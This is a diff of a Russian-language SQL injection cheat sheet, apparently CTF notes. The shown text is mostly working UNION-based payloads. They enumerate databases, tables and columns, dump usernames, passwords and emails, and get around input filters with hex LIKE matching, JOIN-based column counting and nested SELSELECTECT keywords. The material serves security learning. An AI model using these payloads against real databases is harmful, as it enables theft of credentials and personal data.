@@ -92,28 +92,30 @@ session_user() - сессионый пользователь
 
 ### Последовательность действий для выполнения успешной атаки
 
-Выводим все базы данных:
+* Определяем количество столбцов
+* Определяем тип данных каждого столбца
+* Выводим все базы данных:
 
 ```sql
-'union select group_concat(schema_name) from information_schema.schemata
+'union select group_concat(schema_name),NULL,NULL from information_schema.schemata
 ```
 
-Выводим все таблицы из базы данных `database1`:
+* Выводим все таблицы из базы данных database1
 
 ```sql
-'union select group_concat(table_name) from information_schema.tables where table_schema='database1'
+'union select group_concat(table_name),NULL,NULL from information_schema.tables where table_schema='database1'
 ```
 
-Выводим все колонки из таблицы `table1`, которая находится в базе данных `database1`:
+* Выводим все колонки из таблицы `table1`, которая находится в базе данных `database1`:
 
 ```sql
-'union select group_concat(column_name) from information_schema.columns where table_schema='database1' and table_name='table1'
+'union select group_concat(column_name),NULL,NULL from information_schema.columns where table_schema='database1' and table_name='table1'
 ```
 
-Выводим все данные `username`, `password`, `email` из таблицы `table1`, которая находится в базе данных `database1`:
+* Выводим все данные `username`, `password`, `email` из таблицы `table1`, которая находится в базе данных `database1`:
 
 ```sql
-Injection=> select group_concat("\n", username,":",password,":",email,"\n") from database1.table1
+Injection=> select group_concat("\n", username,":",password,":",email,"\n"),NULL,NULL from database1.table1
 ```
 
 ## Обход фильтров
@@ -132,37 +134,37 @@ SELECT * FROM age WHERE age=$age
 
 ### Запрещено все, кроме символов: a-z A-Z 0-9 ' ( ) , ] + и обход защиты от select:
 
-```
+```sql
 SELECT * FROM age WHERE age=$age
 ```
 
 Так как в таблице очень много флагов и нам нужен флаг с `name`=`3f1a76e536a0a805`, то нужно указать фильтр вывода, например, `where name='3f1a76e536a0a805'`, но знак `=` запрещен, следовательно можно использовать `LIKE` вместе с хексовым значением `name`:
 
-```
+```sql
 1337 union Select null,name,flag From flags where name like 0x33663161373665353336613061383035
 ```
 
 ### Запрещено все, кроме символов: a-z A-Z 0-9 ' ( ) \* и обход защиты от select:
 
-```
+```sql
 SELECT * FROM age WHERE age=$age
 ```
 
 Так как мы не можем перебрать количество колонок через `union select null,<null>,<...>`, то можно это сделать через JOIN AS:
 
-```
+```sql
 1337 union Select * from flag JOIN (Select 'qwe') as a
 ```
 
 Ответ:
 
-```
+```sql
 MySQL error: The used SELECT statements have a different number of columns
 ```
 
 Пробуем добавить еще одну колонку:
 
-```
+```sql
 1337 union Select * from flag JOIN (Select 'qwe') as a JOIN (Select 'qwe') as b
 ```
 
@@ -170,12 +172,12 @@ MySQL error: The used SELECT statements have a different number of columns
 
 ### Запрещен SELECT полностью:
 
-```
+```sql
 SELECT * FROM age WHERE age=$age
 ```
 
 Можно использовать SELSELECTECT, если фильтры единоразово вырезают SELECT без цикла:
 
-```
+```sql
 1337 union SELSELECTECT null,null,flag from flag
 ```
